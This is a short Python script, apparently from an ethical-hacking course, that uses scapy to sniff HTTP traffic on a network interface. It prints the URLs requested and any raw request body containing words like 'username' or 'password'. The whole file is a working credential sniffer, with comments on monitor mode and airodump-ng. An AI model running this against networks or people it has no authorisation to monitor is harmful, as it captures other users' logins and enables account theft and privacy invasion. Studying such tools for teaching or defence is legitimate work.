#!/usr/bin/env python

# airodump-ng --band [band-args] --bssid [id] --channel [X] --write [filename] [interface] 
# --> need to be in monitor mode

import scapy.all as scapy
from scapy.layers import http
import optparse

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff.")
    options, arguments = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options

def sniff(interface):
    # scapy.sniff(iface=[interface], prn=[call back func])
    # store=False --> do not store in memory
    # filter --> berkeley packet filter(BPF), e.g. udp, tcp, arp, port [X], except for http
    # count --> maximum of number of packet sniffed
    print("[+] Start sniffing...")
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    # filter for username & password through http
    if packet.haslayer(http.HTTPRequest):
        # print(packet.show())

        # url = host(domain) + path
        url = get_url(packet)
        # print("[+] HTTP Request >> " + str(url))
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + str(login_info) + "\n\n")

def get_url(packet):
    # url = host(domain) + path
    # return byte-like object, python3 distinguish byte object and string
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            # configure terminal(show 500 lines by default)
            #  --> preference->profiles->scolling

            # packet_name[layer].field
            load = str(packet[scapy.Raw].load)
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load


options = get_arguments()
sniff(options.interface)